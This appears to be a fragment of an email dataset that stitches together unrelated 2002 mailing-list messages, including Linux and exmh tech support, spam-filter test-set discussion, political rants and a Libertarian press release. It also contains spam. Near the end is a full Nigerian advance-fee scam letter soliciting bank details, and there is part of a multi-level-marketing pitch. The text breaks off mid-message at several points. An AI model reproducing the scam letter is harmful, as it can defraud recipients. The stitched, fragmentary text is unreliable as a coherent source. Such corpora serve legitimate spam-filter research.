 having sex once. Then, let one of the males also have 
 sex with the other two females. 
 
 Sure, the average number of sex acts and sex partners
 is equal between the sexes, tautologically. 
 
 But here more women than men are:
  - above the single partner threshold
  - above the overall average 1.67 acts/partners threshold
  - above the overall median 1.5 acts/partners
  - above the overall mode 1 acts/partners
 
 And here women have a higher mode (2) and median (2) 
 number of partners.
 
 So in this contrived population, females are more 
 ""promiscuous"" than males, unless ""promiscuity"" is 
 defined uselessly.

 No problems whatsoever. Currently apt.freshrpms.net is running 7.3 with apt
 0.3 and many 8.0 clients with 0.5 are using it.

 Yes it was there.
 You guessed the problem correctly in an earlier e-mail There was still

 The transcode src.rpm now builds perfectly.

 I'm not sure they are doing strictly help-desk stuff.
 But the whole 'who in their right mind would use that? it doesn't have all
 these cool features!' isn't always a guarantee of failure - maybe there is a
 strength in this approach (agents and/or IM as ui) than can find a nich
 application space.

 Kind of like a web query - and with google, someone else can turn them into
 a link so you don't even have to type anything.

 What about a situation where you don't directly ask/talk to the bot, but
 they listen in and advise/correct/interject/etc?
 example: two people discussing trips, etc. may trigger a weather bot to
 mention what the forecast says - without directly being asked.

 This is something new, or at least new to me: 
 
     Politspam (n): Using a spam engine for political purposes.
 
 In this particular case, to get back at the University of Groningen.
 The content suggests its more prank than vigilante activism (in the
 old days we used to say ""someone left their terminal unguarded"")
 but what's interesting is that it's not trying to sell me anything
 or lead me to any for-fee service, it's just trying to spread
 a meme that RUG is evil.

287,"Subject: Living Love - Another legacy of the 60's
","Normally, I disdain any kind of mysticism, even when it is associated 
 with fairly good ideas.  Just a big turnoff.  A good example would be 
 the difference between Yoga/TM and the more scientifically pure, but 
 related, relaxation techniques including ""betagenics"", 
 hypnosis/auto-hypnosis, etc.  (This was one of the many topics I 
 obsessively absorbed as a teenager.)  Or Tai Chi etc. vs. Tai Bo / 
 G-Force Dyno-Staff.
 
 I have to say however that, having found this while looking for 
 something completely unrelated, it has some cute truisms.  I 
 particularly like their addiction to non-addiction.  Additionally, the 
 Mindprod treehugger site has some interesting quotes, etc.
 
 To my internal ear, nearly all of these 60's based new-age vernacular 
 seem to assume that you are a simple child (of the 60's?) who needs some 
 religion-like couching of ideas to relate and internalize.  Very 
 irritating, but taken in small doses it's interesting to compare and 
 contrast with our (my) modern mental models.
 
 I found that a few of the principles could be used to explain and 
 justify US/UN foreign policy and actions.

 A loving person lives in a loving world,

 You make yourself and others suffer just as much when you take offence 
 as when you give offence. To be upset over what you don't have is to 
 waste what you do have.
 
 The past is dead,
 The future is imaginary,
 Happiness can only be
 in the Eternal Now Moment
 
 How soon will you realize that the only thing you don't have is the 
 direct experience that there's nothing you need that you don't have.
 
 Love a person because he or she is there.
 This is the only reason.
 
 Happiness happens when your consciousness is not dominated by addictions 
 and demands~ and you experience life as a parade of preferences.
 
 The
 purpose
 of our lives
 is to be free
 of all addictive traps,
 and thus
 become one
 with the ocean of
 Living Love.

 Thousands spent on strippers, golf memberships
 shows Pentagon spending is out of control, Libertarians say
 
 WASHINGTON, DC -- Quiz question: Which of the following items have been 
 charged to the taxpayers recently by military personnel wielding 
 government-issued credit cards?
 
 (a) $38,000 for lap dancing at strip clubs near military bases.
 
 (b) $3,400 for a Sumo wrestling suit and $9,800 for Halloween costumes.
 
 (c) $7,373 for closing costs on a home and $16,000 for a corporate golf 
 membership.
 
 (d) $4,600 for white beach sand and $19,000 worth of decorative ""river 
 rock"" at a military base in the Arabian desert.
 
 (e) all of the above.
 
 ""Incredibly, the answer is 'all of the above,' said Steve Dasbach, 
 Libertarian Party executive director. ""Thanks to the federal 
 government's policy of doling out credit cards with no questions asked, 
 the military has launched a raid on your wallet.""
 
 The shocking revelations are contained in a General Accounting Office 
 audit released last week that uncovered $101 million in ""seemingly 
 unneeded expenditures"" made by the Air Force and Army in 2000 and 
 2001. The purchases were made possible by the federal government's lax 
 credit card policy: At least 1.4 million Defense Department employees 
 carry credit cards, and last year they used them to splurge on $6.1 
 billion in goods and services, the audit found.
 
 In one case, a group of 200 soldiers used their military IDs and 
 government-issued travel cards to get cash at adult-entertainment bars, 
 then spent the money there. The clubs charged a 10 percent fee to 
 supply the soldiers with cash -- then billed the full amount to their 
 travel cards as a restaurant charge, the GAO found.
 
 ""Are these warriors really fighting terrorism while frolicking in a 
 strip club, or defending our country while wearing a Sumo wrestling 
 suit?"" asked Dasbach. ""Americans who support a bigger defense budget, 
 take note: The Pentagon frequently behaves like any other bloated, 
 reckless government agency. It promises your money will be spent on the 
 worthiest of causes, then squanders it on things you could never even 
 imagine.""
 
 Other spending uncovered by the audit included $45,000 for luxury 
 cruises, $1,800 for executive pillows, and $24,000 for a sofa and 
 armchair at a military installation in the Middle East, Dasbach noted.
  
 Some military employees actually defended the purchases, the audit 
 noted, by saying that recreational items such as golf memberships can 
 be ""a useful tool for building good relations with a host country"" 
 such as Saudi Arabia or the United Arab Emirates. 
 
 Not surprisingly, Dasbach said, the audit found ""little evidence of 
 documented disciplinary action"" against those who misused the cards, 
 so taxpayers may end up paying the tab.
   
 ""It's time to impose a little military discipline on these deadbeat 
 Defense Department workers, and force them to personally reimburse 
 taxpayers for every penny of improper spending,"" he said.
  
 ""Then cut the Pentagon's massive $379 billion budget to help guard 
 against such wasteful spending in the future. Perhaps that's one way to 
 force the Pentagon to spend its resources defending the country, 
 instead of offending the taxpayer.""

292,"Subject: Re: [Razor-users] Problem with Razor 2.14 and Spamassassin 2.41
","This is due to insufficient write privileges to the ""razor-agent.log"" 
 file. A quick work-around is to do a ""chmod go+rx"" on that file (of 
 course, it's better to restrict the access as much as possible).
 
 In Agent.pm, when the Razor2::Logger object is created, if it doesn't 
 have write permission to the log file it does not succeed. Then, later 
 in the code when the log object is used, it fails with the ""unblessed"" 
 error.
 
 Hope this helps,

 Not a bad idea at all, provided we avoid Texas's mistake.  If we get 
 two senators for each of Scotland, Norn Iron, Wales and England, plus 
 our fair share of congressthings, we end up with the biggest voting 
 block in the US legislature and for the presidency, with a political 
 spectrum whose extreme right can't poke the extreme left of the 
 current US one with a long, long stick.  One sudden lurch to the left 
 by the US political establishment later, we own the place.
 
 Byzantium, anyone?

","Robert Harley:

 Yeah, assuming approximately equal populations.
 But that obscures the different modes of
 promiscuity. Both the person who gives sex for
 money or power or companionship and the person
 who uses money and power and companionship to
 get sex are promiscuous, in the broadest sense
 of the word. But their motives and behavior are
 quite different.
 
 Langur monkeys were the example in the cited
 article. ""Dominant males .. kill babies that
 are not their own."" ""The dominant male monkey
 .. seeks to defend his harem of females."" But
 cozying up to the current dominant male isn't
 the best strategy for female langurs, because
 ""dominant males are dethroned by rivals every
 27 months or so."" ""By mating with as many
 extra-group males as possible, female langurs
 ensure their offspring against infanticide,""
 by the male who is likely next to rule the
 roost.
 
 Maybe it's just me, but that doesn't paint a
 picture of carefree females engaged in joyously
 promiscuous couplings. The dom cab driver who
 is taking her two boy toys to New Orleans is a
 better picture of that. ;-)

 Just to throw in another approach to solving the same problem. 
 
 I run two copies of exmh, one at work, one at home.  They both
 display on a ""virtual X server"" created by vncserver on the home
 box.  I connect to that virtual X server using vncviewer wherever
 I happen to be.  The VNC connection is tunneled over ssh and is
 carried over the Internet via an IPSEC appliance.
 
 That gives me access to both home and work email from either 
 place without the complications involved in having two copies of 
 exmh working on the same set of folders.
 
 It's a tad slow viewing work email when I'm at work ... but not 
 so bad that I can't stand it.

     >> Ultimately I'd like to see tight integration into the ""most popular

 The advantage of using a kitchen sink (umm, make that highly programmable)
 editor+email package like Emacs+VM is that you can twiddle your key bindings
 and write a little ELisp (or Pymacs) glue to toss messages in the right
 direction (spam or ham).  For this, spambayes would have to operate in an
 incremental fashion when fed a single ham or spam message.
 
 (No, I have no idea what an ""auto-ham"" is.  A pig run over by a car,
 perhaps?)

306,"Subject: Dabba Wallahs: India's meal-delivery FedEx
","URL: http://boingboing.net/#85494359
 Date: Not supplied
 
 Amazing story about the ""dabba wallahs"" -- India's 112-year-old meal-delivery 
 system that outdoes FedEx using pictograms, bicycles, and largely illiterate 
 (but well-compensated) deliverypeople: 
 
     As part of the tiffin distribution process, every day the meals are picked 
     up from commuters' homes in Mumbai long after the commuters have left for 
     work, delivered to them on time, then picked up and delivered home before 
     the commuters return. 
 
     Each tiffin carrier has, painted on its top, a number of symbols that 
     identify where the carrier was picked up, the originating and destination 
     stations and the address to which it is to be delivered. 
 
     After the tiffin carriers are picked up, they are taken to the nearest 
     railway station, where they are sorted according to the destination 
     station. 
 
     At the destination station they are unloaded by other dabba wallahs and 
     re-sorted, this time according to street address and floor. 
 
     The 80 kg crates of carriers, carried on dabba wallahs' heads, hand-wagons 
     and cycles are delivered at 12.30 p.m., picked up at 1.30 p.m., and 
     returned when they came. 
 
     The system relies on multiple relays of dabba wallahs, and a single tiffin 
     box may change hands up to three times during its journey from home to 
     office.

 Well, first you need to look at the Makefile.PL to see if it uses the
 PREFIX you're trying to pass to it or not. Maybe you'll need to ""override""
 other paths when doing the ""make"".
 Second, the ""%makeinstall"" macro automatically overrides many common values
 like ""prefix="" or ""datadir="", so it's completely redundant with the
 ""PREFIX="" you're passing to it. Take a look at the ""Makefile"" you have at
 that point to see how the ""install"" target is, and what it uses.
 
 Last, as Chris suggested, you can take a look at an existing package, like
 the one in Rawhide ;-)

","
 >>>From time to time I have to travel, and seem to end up with a rather slow
 link back home that makes remote display of exmh rather slow, even over
 ssh and/or VNC. What I'd  like to do is use an imap capable mailer to
 communicate with an imap server that is serving up my MH folders. Does
 anyone know of any Imap servers that can do this? I'd like it to be able
 to handle the  mailstore using MH commands so things don't get out of
 sync. At the moment I use a combo of fetchmail and procmail to handle
 soring things when I'm local, and it's possible that an imap server
 would mung this when I deleted a message remotely.

 I just had to jump in here as Carbonara is one of my favourites to make and ask 
 what the hell are you supposed to use instead of cream?  I've never seen a 
 recipe that hasn't used this.  Personally I use low fat creme fraiche because it 
 works quite nicely but the only time I've seen an supposedly authentic recipe 
 for carbonara  it was identical to mine (cream, eggs and lots of fresh parmesan) 
 except for the creme fraiche.

 Date: 2002-10-07T17:59:05-05:00
 
 _Joe Gregorio_: My next pet project[1]. &#8220;Trying to re-create the ""Good 
 Easy[2]"" on a Windows machine.&#8221; I have also made half-hearted attempts in 
 this direction, as I am forced to use Windows during the day. I say 
 half-hearted because I'm still application-centric, and I don't go as far with 
 keyboard shortcuts as I could. But I don't use the desktop at all (never have, 
 on any system), and I don't use ctrl alt keyboard shortcuts because I 
 personally find them awkward (YMMV). If you must use Windows, the first step 
 towards a productive system is managing your Start menu. 
 
 I use the main level of the Start menu with numbered shortcuts to my most 
 common programs. ""0 Control Panel[3]"", ""1 Mozilla[4]"", ""2 Emacs[5]"", ""3 DOS 
 home"", ""4 DOS work"", ""5 DOS incoming"" (each of which gives me a command line, 
 but in different directories), ""7 Python[6]"", ""9 IE"". Also ""# Explorer home"", 
 ""$ Explorer work"", ""% Explorer incoming"", which open Explorer windows in 
 various useful directories (the same directories as the DOS shortcuts, only 
 with the shift key held down, and yes, I intentionally set it up so that $ went 
 to my work folder). Less-used programs are taken out of their useless submenus 
 (as installed) and moved directly into the Programs submenu and given unique 
 first letters as needed. ""Ad-aware[7]"", ""Excel[8]"", ""IM"", ""Netscape 4[9]"", 
 ""Paint Shop Pro"", ""Query Tool (ODBC)[10]"", ""VMWare[11]"", ""Word[12]"". All other 
 submenus except Startup are removed from the Programs menu. (Yes, delete 
 ""Accessories"". Do you honestly ever use it? If so, it's probably a sign of a 
 larger productivity problem.) Things which never need to be run manually (like 
 WinZip and Quicktime) are removed from the Programs menu. Maintaining a clean 
 Programs menu is an ongoing struggle, but well worth it. 
 
 On most modern keyboards, there is a key next to your left alt key that opens 
 the start menu, which you can press with your left thumb without taking your 
 fingers off the home keys. Otherwise ctrl esc always works. Menu 4 gives me a 
 new command prompt in my work directory. Menu P N runs Netscape 4 (for 
 compatibility testing in my day job, ugh). Mozilla and Emacs are almost always 
 open, but I quit lesser-used applications as soon as I'm done using them 
 (mostly because my laptop doesn't have a lot of memory). 
 
 I install Cygwin[13] so that the command line is actually useful. Cygwin is a 
 collection of Windows ports of all your favorite UNIX utilities, including mv, 
 cp, scp, ssh, man, tar, less, grep, patch, ncftp, cvs, and many others. And 
 bash, which I don't use because I dislike how it handles Windows pathnames. I 
 also set the properties of my command line shortcuts to set the window size to 
 120 x 50 (almost full screen at 1024 x 768), and screen buffer size to 120 x 
 3000. Set window position at 0 x 0, and don't let the system position the 
 window. 
 
 In Mozilla, I set my home page to ""about:blank"", set Internet Search to search 
 with Google, use Tabbed Browsing, open tabs instead of windows in all possible 
 cases, always show the tab bar, and load links in the background (essential for 
 weblog surfing, you can ctrl click links to open them in new tabs in the 
 background). Under Scripts & Plugins, I do not allow scripts to open 
 unrequested windows. I turn off the sidebar, turn on the Site Navigation Bar, 
 delete all pre-installed bookmarks, and create two bookmarks: one which takes 
 me to my webmail, and another which takes me to my internal site search[14], 
 from which I can find all other bookmarks I need. 
 
 In Internet Explorer, I set my home page to the page to edit my weblog, since 
 that's the only thing I do in Internet Explorer. alt tab back and forth between 
 Mozilla and IE is easier than ctrl pgup/pgdown between tabs within Mozilla, 
 since TEXTAREAs in Mozilla lose focus when you switch tabs, making copying and 
 pasting weblog entries virtually impossible. 
 
 I use Emacs locally and vi remotely, because the default behavior of Emacs is 
 so heinous as to render it unusable. (For instance, editing a CGI script named 
 foo.cgi on a web server with Emacs would generate a foo.cgi~ backup file, which 
 is world-readable and is sent as plain text to any browser that asks. Try this 
 sometime on your favorite web site.) Among other things, my .emacs file (which 
 is actually called _emacs on Windows) instructs Emacs to store all backup files 
 in a single directory (d:\backup); to treat all XML files as DocBook, all CGI 
 scripts as Python, and all SQL scripts as PL/SQL; to use Cygwin's bash shell 
 for M-x-shell; to use a single maximized frame with no menubar, titled as the 
 name of the current file; to show column numbers; to accept ""y"" and ""n"" for 
 yes/no questions; not to blink; not to beep; and to close the current file when 
 I press M-w. I use some weird registry hacks and a hacked notepad.exe to get 
 all text files to open in Emacs. (I got this idea from Ultraedit[15].) My 
 _emacs file is my second most backed-up possession. 
 
 I don't use Windows' useless directory structure for user home directories. On 
 my D drive I have d:\home (contains directories for my books and other personal 
 projects, each under CVS control&#8212;also set as my home directory using the 
 HOME environment variable), d:\work (contains directories for each work 
 project, also under CVS), d:\incoming (set as default download directory for 
 all programs that download things), and d:\backup (used by Emacs, and for 
 temporary storage, for instance for storing originals when checking out newly 
 created CVS projects). I don't know or care what's where on my C drive. 
 
 I have tried many, many address books, and still store all my contacts, email 
 addresses, snail mail addresses, phone numbers, and other vital personal 
 information in a text file called phone, stored in d:\home\phone. It is not in 
 any particular format, other than being plain text and usually including blank 
 lines between entries. I categorize people with simple keywords in parentheses 
 after their name, and use M-x-occur in Emacs to search by keyword. This file is 
 my single most backed-up possession. 
 
 Other essential free Windows utilities I use (in no particular order): TweakUI
 [16], Cygwin[17], Guidescope[18], ZoneAlarm[19].

 -----------------------------------------------------------------------------------------------
 ""I. Description
 
    The  CERT/CC  has received confirmation that some copies of the source
    code  for  the  Sendmail  package have been modified by an intruder to
    contain a Trojan horse.
 
    The following files were modified to include the malicious code:
 
      sendmail.8.12.6.tar.Z
      sendmail.8.12.6.tar.gz
 
    These  files  began  to  appear  in  downloads  from  the  FTP  server
    ftp.sendmail.org  on  or  around  September  28,  2002.  The  Sendmail
    development  team  disabled  the  compromised FTP server on October 6,
    2002  at  approximately  22:15  PDT.  It  does  not appear that copies
    downloaded  via  HTTP contained the Trojan horse; however, the CERT/CC
    encourages  users  who  may  have  downloaded the source code via HTTP
    during  this  time  period  to take the steps outlined in the Solution
    section as a precautionary measure.""
 
      OK, it's now time to work out the PGP securing of apt repository traffic. I've never gotten anything but ""sitename.whatever will not be authenticated"" until running Redhat 8.0 when I get something about having ""No Key"" for various files.
 
     What's it take to ensure we're covered against this kind of childish/moronic/Microsoft-era problems?

 I gave it all the thought it deserved <wink>.  It would be wonderful to get
 several people cranking on the same test data, and I'm all in favor of that.
 OTOH, my Data/ subtree currently has more than 35,000 files slobbering over
 134 million bytes -- even if I had a place to put that much stuff, I'm not
 sure my ISP would let me email it in one msg <wink>.
 
 Apart from that, there was a mistake very early on whose outcome was that
 this isn't the data I hoped I was using.  I *hoped* I was using a snapshot
 of only recent msgs (to match the snapshot this way of only spam from 2002),
 but turns out they actually go back to the last millennium.  Greg Ward is
 currently capturing a stream coming into python.org, and I hope we can get a
 more modern, and cleaner, test set out of that.  But if that stream contains
 any private email, it may not be ethically possible to make that available.
 Can you think of anyplace to get a large, shareable ham sample apart from a
 public mailing list?  Everyone's eager to share their spam, but spam is so
 much alike in so many ways that's the easy half of the data collection
 problem.

 have more than 2000 paid members under me in a program that I had
 never promoted?
 
 I took the time to check out the site...then wrote to Vic asking
 for confirmation that these were paid members and not just free
 sign-ups...like me :)
 
 Well, it was true...I had 2365 paid members in my downline. This
 in a program that I had never worked!
 
 All I had to do was upgrade to a paid membership before the end
 of the month and I would have my position locked in and a
 downline of 2365 people.
 
 You can bet I wasted no time in getting my membership upgraded!
 
 I can tell you, if I had known what was happening with this

 This is not a correct assessment.  The American public couldn't care
 less.  However, the US intelligence community correctly perceives a
 threat, and it isn't the third-world.  Many European and other developed
 nations aggressively engage in covert operations against American
 interests.  Its been going on for years and isn't even news.  Things
 have stepped up in recent years and the US DoD is none too pleased.  For
 better or worse, the US is relatively good at that game too.  As with
 most backwater wars, they are proxies for the interests of the big
 players.
 
 Find a current list of the top intelligence threats to the US.  You'll
 find that half the countries on that list are European.  Most people are
 unaware of how aggressive these things have gotten in recent years.

 Bullshit.  The European governments ruthlessly suppress real opposition,
 obviously some more than others.  US SpecOps are often brought in to do
 dirty work inside Europe for European governments (usually with
 government ""advisors"" along for the mission).  I've always wondered what
 the deal was such that we got involved at all.  The point being that
 we've acted as assassins for European governments inside their borders
 against their own citizens under the auspices of those governments, and
 in recent years, not ancient history.  I know SpecOp guys who left the
 military specifically because of the circumstances of some of these
 missions while they were posted for that duty. I'm certainly glad I was
 never assigned missions in that theater, because there is a lot of
 covert nastiness going on in nominally friendly European democracies.
 
 Regardless, giving money to people that threaten you has never created
 meaningful peace in the history of civilization.  We call it extortion
 under any other guise.

 Europe is looking increasingly like a basket case.  Whatever problems
 the US is having these days, Europe looks worse and is going downhill
 faster.  Why the US would want to emulate European behavior or the
 European way of doing things is beyond me.
 
 The US asking for major policy advice from Europe is like asking a quack
 for medical advice.  I really don't see what is wrong with ""unilateral""
 anyway.  Why should anyone join a stampede that is heading for a cliff?
 I hope the incessant knee-jerk conformist screeching that Americans see
 coming from Europe doesn't actually represent the views of Europeans. 
 
 For various reasons I'm not exactly a cheerleader for the US government,
 but the premises of the argument against them here are lame.

 I'm betting you are underestimating the actual percentage.  The vast
 majority of people I know have lived, worked, and traveled outside the
 country at one time or another.  And I doubt Europeans have traveled
 anywhere near as much in the Western hemisphere as Americans have. 
 Despite the best efforts of France, Europe is *still* not the center of
 the universe.  I'll throw you a bone though: most Americans do consider
 Europe to be drifting into irrelevancy and therefore ignore it.  But
 from the perspective of an American, how could you NOT look at it this
 way?  The impact of Europe on America has diminished greatly over the
 years.
 
 I love the smell of Euro-chauvinism in the morning.
 
 First, you assume that the North American continent is ethnically and
 culturally homogenous.  Anybody that has actually traveled throughout
 North America knows this isn't true; there are more than five major and
 very distinct cultures and societies in the US alone, never mind the
 hundreds of diverse regional sub-populations, some of which are truly
 foreign.  Apparently Europeans confuse speaking the same language with
 having the same culture.  That would be like saying Mexico is culturally
 identical to Spain because they nominally speak the same language.  A
 Wyoming rancher has almost nothing in common culturally or socially with
 your average person living in San Francisco, despite speaking the same
 language and nominally living in the same country.  If I want to visit a
 wildly different culture for the holidays, I'll go to Oakland, New
 Orleans, or similar -- they are far more different from where I live
 than some countries I've traveled to.  And a lot of these places are
 farther from where I live than Spain is from Germany.
 
 Second, the State I live in is the size of Germany.  When I travel to a
 neighboring State (which I do regularly), how is this not equivalent? 
 In fact, I probably travel much farther for the holidays than your
 German construction workers.  If you look at the EU as a single country,
 only then does your analogy become comparable.  What kind of ridiculous
 superiority do Europeans get from having (relatively) tiny countries?
 
 In truth, I find Europe to be about as culturally homogeneous as the
 US.  There are a lot of cultural similarities across the EU with
 relatively minor local deviations that vary with distance in ways very
 similar to the US.  The only real difference is that Europeans have
 dozens of different languages, which is hardly something I would call an
 advantage.  Although there are a couple parts of the US where I can't
 understand a word they are saying either.

 href=""http://www.aicardi.com/"" target=""_blank"">Aicardi Syndrome Foundation</a>. 
 Though I don't currently know their technical needs, I do know that the syndrome 
 
 
 
 is very rare - read ""research and technical dollars are minimal."" I'm sure we 
 can, as a group, provide them a way to fill existing technical holes.<p>
 
 That's just a suggestion. Feel free to use the mailto links above to make 
 others.<p>
 
 Over the next few weeks, I plan on modifying my current favorite blogging 
 program, <a href=""http://geeklog.sourceforge.net/"" target=""_blank"">GeekLog</a> 
 to pull together a community project area where interested parties can gather, 
 coordinate and discuss whatever this project might become. I'll keep you posted 
 on the details.<p>
 
 In one of the earliest issues of Penguin Shell, I told a story about Emperor 
 Penguins - how they huddle together on the shore, knowing that their protection 
 from predators lies in sheer numbers. When one takes the leap into the water, 
 all the others follow; individual involvement for the good of the community.<p>
 
 Where could the analogy possibly be more fitting?<p><p>

 <b>Quick Shortcuts</b><p>
 
 Linux is chock full of keyboard shortcuts that, when used, streamline the way 
 you use your system. Today's Tweaks are really user tweaks - built in shortcuts 
 you can use to maximize your Linux efficiency. You don't have to change your 
 system, just how you use what's already there. They're two tips that are quick 
 and very easy to learn and remember.<p>
 
 Got a cluttered console screen? Use <b>[ctrl]+l</b> to clear it. This does the 
 same thing as the <b>clear</b> command with far fewer keystrokes.<p>
 
 Do you want to log out of the console screen quickly? Use the <b>[ctrl+d</b> key 
 
 
 
 combination. This will log out the current user. If you're using bash and the 
 current user is not root, the [ctrl]+d combination will close the terminal 
 window, as well.<p>
 
 To me, any opportunity to save keystrokes is a good one. Better yet, if I can 
 avoid having to take my fingers from the keyboard to reach for the mouse, then 
 I've really saved some time. Though it's tough to quantify the time savings 
 using these keystroke combination shortcuts, intuitively I can tell you it's 
 substantial.<p>
 
 Maximum efficiency. That's what Tweaks are all about.<p><p>

 <b>Kernel Configuration - Part XI</b><p>
 
 We've covered some fairly light topics to this point in the kernel configuration 
 
 
 
 series. Today's topic requires a bit of review. We'll discuss configuring block 
 devices in your kernel.<p>
 
 We've talked about the different types of devices in previous Penguin Shell 
 issues. Fundamentally, the two that you'll deal with the most are block and 
 character devices. These draw their type names from the way they handle data. 
 Block devices receive data for storage in chunks, generally pre-set sizes of 
 data ""blocks."" Hard drives are block devices. They'll only write chunks of data 
 to storage. Thus, the problem with shutting down your machine uncleanly. Data 
 intended for storage may not, in fact, have been written at the time your power 
 dies or you hard kill your machine. The system may still be accumulating data up 
 
 
 
 to the proper block size before committing it to the hard drive.<p>
 
 Character devices, on the other hand, receive data in ""streams,"" one character 
 at a time. Serial ports are a great example of character devices. They handle 
 data input and output on the fly, rather than filling a buffer <i>then</i> 
 committing the data.<p>
 
 The physical nature of these device types goes a long way toward explaining why 
 they handle data as they do. A hard drive has to physically spin up to store or 
 retrieve data. You're actually changing the magnetic properties of the disc 
 surface when you store data. Consequently, a hard drive has to know where 
 there's free space on the disc surface, has to move that area of the disc under 
 the write head and try, as best it can, to group blocks of related data 
 together.<p>
 
 Character devices really don't store data as much as they send it off and forget 
 
 
 
 about it. The process is purely electrical rather than electrical and physical. 
 The serial port, for example, sends data in a stream to your Palm Pilot. The 
 storage of the data is actually handled by the Palm itself, not a physical 
 storage device on the computer. There's no need to spin up a drive and account 
 for the data as is necessary with a hard drive. The Palm will also send a signal 
 
 
 
 back to the computer confirming receipt of data. That's an indication that 
 character devices often communicate in both directions, as well.<p>
 
 So, when you're configuring block devices in your kernel, you're preparing the 
 system for communicating with a device that will buffer data to a predetermined 
 level, then write that data as a block, changing the physical properties of the 
 hard drive disc surface. Even though that's the highest level view of the 
 process, it still shows how difficult a process physical data storage really 
 is.<p>
 
 In the block device section, you'll find many options for physical data storage. 
 
 
 
 When configuring this section, it's crucial to know as much about your existing 
 hardware as possible. What type (brand) of hard drives are you using? What's the 
 
 
 
 interface to the machine - IDE, parallel, etc? Where is the drive located - on 
 the local machine or on a network-connected box? Because the variables are so 
 broad, it's nearly impossible to give you a stock configuration tip that will 
 work for your personal machine every time. I can tell you this - you will have 
 block devices (normally a hard drive and a floppy), and you need to answer as 
 many of the above questions as you can. Find out as much about these physical 
 devices as you can, and the configuration process will be relatively 
 painless.<p>
 
 A warning - you'll see more configuration tips like this as the series continues 
 
 
 
 to progress. I'll certainly make hands-on configuration recommendations where 
 possible. There are quite a few areas where I can make such recommendations. 
 However, where the variable set is as broad as block devices, much of the 
 legwork will be up to you.<p>
 
 Tomorrow, we'll talk about RAID and multi-device support in Linux.<p>

 I'm jumping in here since I'm just back on
 ILUG after quite a long break, anyway...
 
 Alan Cox was mentioning that he might have borked
 some PNP stuff lately. You could try 2.4.19-ac4
 to see if it helps.

 and it looks like PPP for USD 33k is only
 about USD 50k*, at least in Big Macs:
 
 <http://www.economist.com/images/20020427/CFN751.gif>
 Australia	 A$3.00 USD 1.62	-35%
 US		  $2.49 USD 2.49
 Switzerland	SFr6.30 USD 3.81	+53%
 
 Interestingly enough, although housing in
 Perth seems cheap, housing in Switzerland
 doesn't seem to be as expensive as the Big
 Macs would imply.

",">>From the Desk of Mr. Kenneth Uba
  
 Union Bank of Nigeria,
  
 Lagos-Nigeria.
  
  
  
 ATTN: THE PRESIDENT/C.E.O
  
 STRICTLY A PRIVATE BUSINESS PROPOSAL
  
  
  
 Dear Sir,
  
 I am Mr. Kenneth Uba, the manager bills and exchange
 at the Foreign Remittance Department of the Union Bank of Nigeria Plc. 
  
 I am writing this letter to ask for your support and
 cooperation to carry out this business opportunity in my department. 
  
 We discovered an abandoned sum of $31,000,000.00 (Thirty One million United States Dollars only) in an account that belongs to one of our foreign customers who died along with his entire family of a wife and two children in November 1997 in a Plane crash.
  
 
  
 Since we heard of his death, we have been expecting his next-of-kin to come over and put claims for his money as the heir, because we cannot release the fund from his account unless someone applies for claim as
 the next-of-kin to the deceased as indicated in our banking guidelines.
 Unfortunately, neither their family member nor distant relative has ever appeared to claim the said fund. 
  
 Upon this discovery, I and other officials in my department have agreed to make business with you and release the total amount into your account as the heir of the fund since no one came for it or discovered he maintained account with our bank, otherwise the fund will be returned to the bank's treasury as unclaimed fund.
  
 We have agreed that our ratio of sharing will be as stated thus; 
 20 % for you as foreign partner, 75 % for us the officials in my department and 5 % for the settlement of all local and foreign expenses incurred by us and you during the course of this business.
  
 
 Upon the successful completion of this transfer, I and one of my colleagues will come to your country and mind our share. It is from our 75 % we intend to import Agricultural machineries into my country as a way of recycling the fund.  
 
 To commence this transaction, we require you to immediately indicate your interest by a return e-mail and enclose your private contact telephone number, fax number full name and address and your designated
 bank coordinates to enable us file letter of claim to the appropriate departments for necessary approvals before the transfer can be made.
 
 Note also, this transaction must be kept STRICTLY CONFIDENTIAL because of its nature. 
  
 I look forward to receiving your prompt response.
  
  
  
 Mr. Kenneth Uba
  
 Union Bank of Nigeria.

336,"Subject: [Spambayes] test sets?
","
 I've got a test set here that's the last 3 and a bit years email to
 info@ekit.com and info@ekno.com - it's a really ugly set of 20,000+
 messages, currently broken into 7,000 spam, 9,000 ham, 9,000 currently
 unclassified. These addresses are all over the 70-some different 
 ekit/ekno/ISIConnect websites, so they get a LOT of spam.
 
 As well as the usual spam, it also has customers complaining about 
 credit card charges, it has people interested in the service and 
 asking questions about long distance rates, &c &c &c. Lots and lots 
 of ""commercial"" speech, in other words. Stuff that SA gets pretty 
 badly wrong.
 
 I'm currently mangling it by feeding all parts (text, html, whatever 
 else :) into the filters, as well as both a selected number of headers 
 (to, from, content-type, x-mailer), and also a list of 
 (header,count_of_header). This is showing up some nice stuff - e.g. the 
 X-uidl that stoopid spammers blindly copy into their messages.
 
 I did have Received in there, but it's out for the moment, as it causes
 rates to drop.
 
 I'm also stripping out HTML tags, except for href="""" and src="""" - there's
 so so much goodness in them (note that I'm only keeping the contents of
 the attributes).

 Just tried smartgroups: The layout of pages is pretty challenging to
 use quickly, but the most interesting aspect is that once you are in,
 there is no way to get out.  You can unsubscribe yourself as the sole
 member of a group, but you cannot delete the group.
 
 Or if you can, I couldn't find it before deleting myself, and now it's
 invisible to me.  Another interesting thing: Security forms are reset
 to full-public settings each time you load them, rather than set from
 your current settings.
 
 All in all, I wasn't impressed and have stayed with the Yahooligans
 for another run.

","Hi all,
 
 I have a debian machine with an external ISDN terminal adapter, which 
 I'm trying to get to dial a Cisco 3600 running CHAP. wvdial on Red Hat 
 copes fine with this. However, I get the same results if i use pon or 
 wvdial on Debian: pppd negotiation is detected, pppd is started -- and 
 I'm never assigned an IP address.
 
 Looking at the logs on the Cisco, I see that in place of the username I 
 seem to be transmitting a six-digit hex number. e.g.:

 I suspect that as part of Chris' set of changes, he cleaned up the
 use of the variable that was named ""L"" in FtocCommit (in ftoc.tcl).
 Its name got changed from L to lineno
 
 But there's one reference of $L left.   That causes tracebacks if
 you attempt to use ""link"" with the current CVS version of exmh.
 
 I guess that most of us don't use ""link"" very often ... I noticed it
 last week, but only got time to look and see why today.
 
 If someone with the ability to commit to the CVS repository would
 apply the following patch (to lib/ftoc.tcl) that would be nice.
 (It works... and is trivial, and you could perhaps just apply it by
 making the change with an editor faster than saving this patch and
 applying it - there's only one instance of $L in the file, that
 should be changed to $lineno)

","
 Hi all,
 
 I have 3 or 4 email addresses (which get used for different
 reasons), and I'd prefer not to mix them up. So I was wondering
 if anyone knows of a way that I can have mail (apart from list
 mail, which I have already sorted) which arrives to a certain
 e-mail address have the From: header in the reply automatically
 set to the address it came to.
 
